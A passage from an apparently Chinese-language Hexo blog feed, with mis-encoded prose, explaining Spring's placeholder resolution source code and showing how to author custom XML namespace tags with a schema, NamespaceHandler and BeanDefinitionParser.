class="keyword">this</span>.nonStrictHelper);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">resolveRequiredPlaceholders</span><span class="params">(String text)</span> <span class="keyword">throws</span> IllegalArgumentException </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>.strictHelper == <span class="keyword">null</span>) &#123;</span><br><span class="line">			<span class="keyword">this</span>.strictHelper = createPlaceholderHelper(<span class="keyword">false</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> doResolvePlaceholders(text, <span class="keyword">this</span>.strictHelper);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>è°ƒç”¨çš„æ˜¯å†…éƒ¨æ–¹æ³•:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">doResolvePlaceholders</span><span class="params">(String text, PropertyPlaceholderHelper helper)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> helper.replacePlaceholders(text, <span class="keyword">new</span> PropertyPlaceholderHelper.PlaceholderResolver() &#123;</span><br><span class="line">		<span class="meta">@Override</span></span><br><span class="line">		<span class="function"><span class="keyword">public</span> String <span class="title">resolvePlaceholder</span><span class="params">(String placeholderName)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> getPropertyAsRawString(placeholderName);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æœ€ç»ˆè°ƒç”¨åŠŸèƒ½çš„æ˜¯<code>PropertyPlaceholderHelper</code>çš„replacePlaceholdersæ–¹æ³•ï¼Œ</p>
<p>è¿™ä¸ªhelperåœ¨æ„é€ æ˜¯é€šè¿‡ <code>createPlaceholderHelper</code>æ–¹æ³•æ„å»ºçš„ï¼Œä»–æ¥å—ä¸€ä¸ªboolç±»å‹çš„å‚æ•°</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> PropertyPlaceholderHelper <span class="title">createPlaceholderHelper</span><span class="params">(<span class="keyword">boolean</span> ignoreUnresolvablePlaceholders)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">new</span> PropertyPlaceholderHelper(<span class="keyword">this</span>.placeholderPrefix, <span class="keyword">this</span>.placeholderSuffix,</span><br><span class="line">			<span class="keyword">this</span>.valueSeparator, ignoreUnresolvablePlaceholders);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªboolå€¼å°±æ˜¯è¡¨ç¤ºæ˜¯å¦è¦ignoreæ‰ä¸èƒ½è§£æçš„å±æ€§ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Creates a new &#123;<span class="doctag">@code</span> PropertyPlaceholderHelper&#125; that uses the supplied prefix and suffix.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> placeholderPrefix the prefix that denotes the start of a placeholder</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> placeholderSuffix the suffix that denotes the end of a placeholder</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> valueSeparator the separating character between the placeholder variable</span></span><br><span class="line"><span class="comment">	 * and the associated default value, if any</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> ignoreUnresolvablePlaceholders indicates whether unresolvable placeholders should</span></span><br><span class="line"><span class="comment">	 * be ignored (&#123;<span class="doctag">@code</span> true&#125;) or cause an exception (&#123;<span class="doctag">@code</span> false&#125;)</span></span><br><span class="line"><span class="comment">	 */</span></span><br></pre></td></tr></table></figure>
<p>æ¥ç€è¿½</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Replaces all placeholders of format &#123;<span class="doctag">@code</span> $&#123;name&#125;&#125; with the value returned</span></span><br><span class="line"><span class="comment"> * from the supplied &#123;<span class="doctag">@link</span> PlaceholderResolver&#125;.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> value the value containing the placeholders to be replaced</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> placeholderResolver the &#123;<span class="doctag">@code</span> PlaceholderResolver&#125; to use for replacement</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the supplied value with placeholders replaced inline</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">replacePlaceholders</span><span class="params">(String value, PlaceholderResolver placeholderResolver)</span> </span>&#123;</span><br><span class="line">	Assert.notNull(value, <span class="string">"'value' must not be null"</span>);</span><br><span class="line">	<span class="keyword">return</span> parseStringValue(value, placeholderResolver, <span class="keyword">new</span> HashSet&lt;String&gt;());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> String <span class="title">parseStringValue</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">			String strVal, PlaceholderResolver placeholderResolver, Set&lt;String&gt; visitedPlaceholders)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">		StringBuilder result = <span class="keyword">new</span> StringBuilder(strVal);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">int</span> startIndex = strVal.indexOf(<span class="keyword">this</span>.placeholderPrefix);</span><br><span class="line">		<span class="keyword">while</span> (startIndex != -<span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">int</span> endIndex = findPlaceholderEndIndex(result, startIndex);</span><br><span class="line">			<span class="keyword">if</span> (endIndex != -<span class="number">1</span>) &#123;</span><br><span class="line">				String placeholder = result.substring(startIndex + <span class="keyword">this</span>.placeholderPrefix.length(), endIndex);</span><br><span class="line">				String originalPlaceholder = placeholder;</span><br><span class="line">				<span class="keyword">if</span> (!visitedPlaceholders.add(originalPlaceholder)) &#123;</span><br><span class="line">					<span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(</span><br><span class="line">							<span class="string">"Circular placeholder reference '"</span> + originalPlaceholder + <span class="string">"' in property definitions"</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="comment">// Recursive invocation, parsing placeholders contained in the placeholder key.</span></span><br><span class="line">				placeholder = parseStringValue(placeholder, placeholderResolver, visitedPlaceholders);</span><br><span class="line">				<span class="comment">// Now obtain the value for the fully resolved key...</span></span><br><span class="line">				String propVal = placeholderResolver.resolvePlaceholder(placeholder);</span><br><span class="line">				<span class="keyword">if</span> (propVal == <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.valueSeparator != <span class="keyword">null</span>) &#123;</span><br><span class="line">					<span class="keyword">int</span> separatorIndex = placeholder.indexOf(<span class="keyword">this</span>.valueSeparator);</span><br><span class="line">					<span class="keyword">if</span> (separatorIndex != -<span class="number">1</span>) &#123;</span><br><span class="line">						String actualPlaceholder = placeholder.substring(<span class="number">0</span>, separatorIndex);</span><br><span class="line">						String defaultValue = placeholder.substring(separatorIndex + <span class="keyword">this</span>.valueSeparator.length());</span><br><span class="line">						propVal = placeholderResolver.resolvePlaceholder(actualPlaceholder);</span><br><span class="line">						<span class="keyword">if</span> (propVal == <span class="keyword">null</span>) &#123;</span><br><span class="line">							propVal = defaultValue;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (propVal != <span class="keyword">null</span>) &#123;</span><br><span class="line">					<span class="comment">// Recursive invocation, parsing placeholders contained in the</span></span><br><span class="line">					<span class="comment">// previously resolved placeholder value.</span></span><br><span class="line">					propVal = parseStringValue(propVal, placeholderResolver, visitedPlaceholders);</span><br><span class="line">					result.replace(startIndex, endIndex + <span class="keyword">this</span>.placeholderSuffix.length(), propVal);</span><br><span class="line">					<span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</span><br><span class="line">						logger.trace(<span class="string">"Resolved placeholder '"</span> + placeholder + <span class="string">"'"</span>);</span><br><span class="line">					&#125;</span><br><span class="line">					startIndex = result.indexOf(<span class="keyword">this</span>.placeholderPrefix, startIndex + propVal.length());</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.ignoreUnresolvablePlaceholders) &#123;</span><br><span class="line">					<span class="comment">// Proceed with unprocessed value.</span></span><br><span class="line">					startIndex = result.indexOf(<span class="keyword">this</span>.placeholderPrefix, endIndex + <span class="keyword">this</span>.placeholderSuffix.length());</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Could not resolve placeholder '"</span> +</span><br><span class="line">							placeholder + <span class="string">"'"</span> + <span class="string">" in string value \""</span> + strVal + <span class="string">"\""</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				visitedPlaceholders.remove(originalPlaceholder);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				startIndex = -<span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> result.toString();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>å®é™…è§£æçš„ä»£ç éƒ½åœ¨è¿™é‡Œï¼š</p>
<ol>
<li>å–å‡ºplaceHolderçš„åç§°.</li>
<li>åˆ¤æ–­æœ‰æ²¡æœ‰å¾ªç¯å¼•ç”¨çš„æƒ…å†µ.</li>
<li>é€’å½’æ›¿æ¢ï¼Œè·å–å¯¹åº”çš„å€¼.</li>
<li>å¦‚æœå€¼ä¸ºç©ºï¼Œè§£æé»˜è®¤å€¼.</li>
</ol>
<h3 id="PropertyPlaceholderConfigurer"><a href="#PropertyPlaceholderConfigurer" class="headerlink" title="PropertyPlaceholderConfigurer"></a>PropertyPlaceholderConfigurer</h3><p>åº”è¯¥å’Œä¸Šé¢çš„ç±»ä¼¼ï¼ŒæŠ½æ—¶é—´è¡¥ã€‚</p>
]]></content>
      
        <categories>
            
            <category> spring </category>
            
        </categories>
        
        
        <tags>
            
            <tag> placeholder </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Springè‡ªå®šä¹‰æ ‡ç­¾ï¼Œä½¿ç”¨å’Œæºç ]]></title>
      <url>http://qsli.github.io/2016/10/23/custom-tag/</url>
      <content type="html"><![CDATA[<h2 id="è‡ªå®šä¹‰æ ‡ç­¾"><a href="#è‡ªå®šä¹‰æ ‡ç­¾" class="headerlink" title="è‡ªå®šä¹‰æ ‡ç­¾"></a>è‡ªå®šä¹‰æ ‡ç­¾</h2><p>Springä¸­çš„æ ‡ç­¾å…·æœ‰å¾ˆå¼ºçš„æ‰©å±•æ€§ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆæ–¹ä¾¿çš„æ‰©å±•å‡ºè‡ªå·±çš„æ ‡ç­¾ï¼Œåšå‡ºç±»ä¼¼ä¸‹é¢çš„æ ‡ç­¾<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dubbo:service</span> <span class="attr">interface</span>=<span class="string">"com.foo.BarService"</span> <span class="attr">ref</span>=<span class="string">"barService"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dubbo:reference</span> <span class="attr">id</span>=<span class="string">"barService"</span> <span class="attr">interface</span>=<span class="string">"com.foo.BarService"</span> /&gt;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="1-Authoring-the-schema"><a href="#1-Authoring-the-schema" class="headerlink" title="1. Authoring the schema"></a>1. Authoring the schema</h3><p>å®šä¹‰æ ‡ç­¾çš„xmlæè¿°ï¼š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsd:schema</span> <span class="attr">xmlns</span>=<span class="string">"http://www.mycompany.com/schema/myns"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">xmlns:xsd</span>=<span class="string">"http://www.w3.org/2001/XMLSchema"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">xmlns:beans</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">targetNamespace</span>=<span class="string">"http://www.mycompany.com/schema/myns"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">elementFormDefault</span>=<span class="string">"qualified"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">attributeFormDefault</span>=<span class="string">"unqualified"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsd:import</span> <span class="attr">namespace</span>=<span class="string">"http://www.springframework.org/schema/beans"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsd:element</span> <span class="attr">name</span>=<span class="string">"dateformat"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsd:complexType</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xsd:complexContent</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">xsd:extension</span> <span class="attr">base</span>=<span class="string">"beans:identifiedType"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">xsd:attribute</span> <span class="attr">name</span>=<span class="string">"lenient"</span> <span class="attr">type</span>=<span class="string">"xsd:boolean"</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">xsd:attribute</span> <span class="attr">name</span>=<span class="string">"pattern"</span> <span class="attr">type</span>=<span class="string">"xsd:string"</span> <span class="attr">use</span>=<span class="string">"required"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">xsd:extension</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">xsd:complexContent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">xsd:complexType</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xsd:element</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsd:schema</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>å®šä¹‰äº†æ ‡ç­¾é‡Œé¢çš„å±æ€§å’Œå±æ€§çš„ç±»å‹ï¼Œ åœ¨è§£æxmlçš„æ—¶å€™springä¼šè¿›è¡Œæ ¡éªŒ</p>
<h3 id="2-Coding-a-NamespaceHandler"><a href="#2-Coding-a-NamespaceHandler" class="headerlink" title="2. Coding a NamespaceHandler"></a>2. Coding a NamespaceHandler</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.springframework.samples.xml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.xml.NamespaceHandlerSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyNamespaceHandler</span> <span class="keyword">extends</span> <span class="title">NamespaceHandlerSupport</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        registerBeanDefinitionParser(<span class="string">"dateformat"</span>, <span class="keyword">new</span> SimpleDateFormatBeanDefinitionParser());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¸»è¦æ˜¯å®šä¹‰æ ‡ç­¾çš„å¤„ç†ç±»ï¼Œè¿™é‡Œæ˜¯<code>SimpleDateFormatBeanDefinitionParser</code></p>
<h3 id="3-BeanDefinitionParser"><a href="#3-BeanDefinitionParser" class="headerlink" title="3. BeanDefinitionParser"></a>3. BeanDefinitionParser</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.springframework.samples.xml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.support.BeanDefinitionBuilder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.xml.AbstractSingleBeanDefinitionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Element;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SimpleDateFormatBeanDefinitionParser</span> <span class="keyword">extends</span> <span class="title">AbstractSingleBeanDefinitionParser</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Class <span class="title">getBeanClass</span><span class="params">(Element element)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> SimpleDateFormat<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doParse</span><span class="params">(Element element, BeanDefinitionBuilder bean)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// this will never be null since the schema explicitly requires that a value be supplied</span></span><br><span class="line">        String pattern = element.getAttribute(<span class="string">"pattern"</span>);</span><br><span class="line">        bean.addConstructorArg(pattern);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// this however is an optional property</span></span><br><span class="line">        String lenient = element.getAttribute(<span class="string">"lenient"</span>);</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.hasText(lenient)) &#123;</span><br><span class="line">            bean.addPropertyValue(<span class="string">"lenient"</span>, Boolean.valueOf(lenient));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¯¥ç±»ç»§æ‰¿è‡ªspringæä¾›çš„æŠ½è±¡ç±»<code>AbstractSingleBeanDefinitionParser</code>ï¼Œæä¾›äº†è®¸å¤šåŸºæœ¬çš„åŠŸèƒ½ï¼Œè§£ææ ‡ç­¾çš„æ–¹æ³•åœ¨<code>doParse</code>ä¸­ï¼Œspringä¼šä¼ å…¥ä¸€ä¸ªæ ‡ç­¾å…ƒç´ <code>Element</code>å’Œ<code>BeanDefinitionBuilder</code>çš„ä¸Šä¸‹æ–‡ã€‚</p>
<h3 id="4-Registering-the-handler-and-the-schema"><a href="#4-Registering-the-handler-and-the-schema" class="headerlink" title="4. Registering the handler and the schema"></a>4. Registering the handler and the schema</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â””â”€META-INF</span><br><span class="line">        spring.handlers</span><br><span class="line">        spring.schemas</span><br></pre></td></tr></table></figure>
<p><code>spring.handlers</code>ä¸­çš„å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http\://www.mycompany.com/schema/myns=org.springframework.samples.xml.MyNamespaceHandler</span><br></pre></td></tr></table></figure>
<p><code>spring.schemas</code>ä¸­å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http\://www.mycompany.com/schema/myns/myns.xsd=org/springframework/samples/xml/myns.xsd</span><br></pre></td></tr></table></figure>
<p>springåœ¨åŠ è½½è¿™ä¸ªjaråŒ…çš„æ—¶å€™ä¼šè‡ªåŠ¨çš„ä»è¿™äº›æ–‡ä»¶ä¸­è§£æåˆ°æˆ‘ä»¬çš„é…ç½®ï¼Œå½“è§£æåˆ°ç›¸åº”çš„æ ‡ç­¾çš„æ—¶å€™å°±ä¼šäº¤ç»™æˆ‘ä»¬å®šä¹‰çš„è§£æç±»æ¥å¤„ç†ã€‚<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">myns:dateformat</span> <span class="attr">id</span>=<span class="string">"dateFormat"</span></span></span><br><span class="line"><span class="tag"><span class="attr">pattern</span>=<span class="string">"yyyy-MM-dd HH:mm"</span></span></span><br><span class="line"><span class="tag"><span class="attr">lenient</span>=<span class="string">"true"</span>/&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="Custom-attributes-on-â€˜normalâ€™-elements"><a href="#Custom-attributes-on-â€˜normalâ€™-elements" class="headerlink" title="Custom attributes on â€˜normalâ€™ elements"></a>Custom attributes on â€˜normalâ€™ elements</h2><p>é™¤äº†è‡ªå®šä¹‰æ ‡ç­¾å¤–ï¼Œè¿˜å¯ä»¥ä¸ºå·²æœ‰æ ‡ç­¾è£…é¥°ä¸€ä¸ªæ–°çš„å±æ€§</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"checkingAccountService"</span> <span class="attr">class</span>=<span class="string">"com.foo.DefaultCheckingAccountService"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">jcache:cache-name</span>=<span class="string">"checking.account"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- other dependencies here... --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>springå¯ä»¥è®©æˆ‘ä»¬å•ç‹¬å¤„ç†è¿™ä¸ª<code>jcache:cache-name</code>è¿™ä¸ªå±æ€§ã€‚</p>
<h3 id="å®šä¹‰schema"><a href="#å®šä¹‰schema" class="headerlink" title="å®šä¹‰schema"></a>å®šä¹‰schema</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsd:schema</span> <span class="attr">xmlns</span>=<span class="string">"http://www.foo.com/schema/jcache"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">xmlns:xsd</span>=<span class="string">"http://www.w3.org/2001/XMLSchema"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">targetNamespace</span>=<span class="string">"http://www.foo.com/schema/jcache"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">elementFormDefault</span>=<span class="string">"qualified"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsd:attribute</span> <span class="attr">name</span>=<span class="string">"cache-name"</span> <span class="attr">type</span>=<span class="string">"xsd:string"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsd:schema</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="NamespaceHandler"><a href="#NamespaceHandler" class="headerlink" title="NamespaceHandler"></a>NamespaceHandler</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JCacheNamespaceHandler</span> <span class="keyword">extends</span> <span class="title">NamespaceHandlerSupport</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.registerBeanDefinitionDecoratorForAttribute(<span class="string">"cache-name"</span>,</span><br><span class="line">            <span class="keyword">new</span> JCacheInitializingBeanDefinitionDecorator());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å®é™…çš„è°ƒç”¨è¡Œä¸ºå·²ç»è¢«æŠ½è±¡åˆ°<code>NamespaceHandlerSupport</code>ä¸­</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Decorates the supplied &#123;<span class="doctag">@link</span> Node&#125; by delegating to the &#123;<span class="doctag">@link</span> BeanDefinitionDecorator&#125; that</span></span><br><span class="line"><span class="comment"> * is registered to handle that &#123;<span class="doctag">@link</span> Node&#125;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> BeanDefinitionHolder <span class="title">decorate</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    Node node, BeanDefinitionHolder definition, ParserContext parserContext)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> findDecoratorForNode(node, parserContext).decorate(node, definition, parserContext);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
